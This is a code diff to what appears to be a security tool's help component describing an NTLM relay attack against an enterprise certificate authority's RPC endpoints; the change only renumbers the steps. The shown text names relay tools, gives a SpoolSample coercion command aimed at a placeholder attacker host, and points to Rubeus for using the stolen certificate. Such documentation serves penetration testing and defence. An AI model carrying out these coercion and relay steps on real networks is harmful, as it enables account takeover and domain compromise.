@@ -22,11 +22,11 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
             <Typography variant='body2'>
-                1: Start the Relay Server The NTLM relay can be executed with tools like Inveigh or ntlmrelayx.py,
+                1. Start the Relay Server The NTLM relay can be executed with tools like Inveigh or ntlmrelayx.py,
                 targeting the RPC endpoints of the enterprise CA server.
             </Typography>
             <Typography variant='body2'>
-                2: Coerce the Target Computer Several coercion methods are documented here:{' '}
+                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -53,11 +53,11 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
             </Typography>
             <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
             <Typography variant='body2'>
-                3: Relay to RPC Endpoints The relayed authentication is directed to the RPC endpoints of the vulnerable
+                3. Relay to RPC Endpoints The relayed authentication is directed to the RPC endpoints of the vulnerable
                 enterprise CA server. This requires that RPC encryption is not enforced on the target CA.
             </Typography>
             <Typography variant='body2'>
-                4: Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                4. Authenticate using the certificate obtained as the target principal, for example by using{' '}
                 <Link target='_blank' rel='noopener' href='https://github.com/GhostPack/Rubeus'>
                     Rubeus
                 </Link>
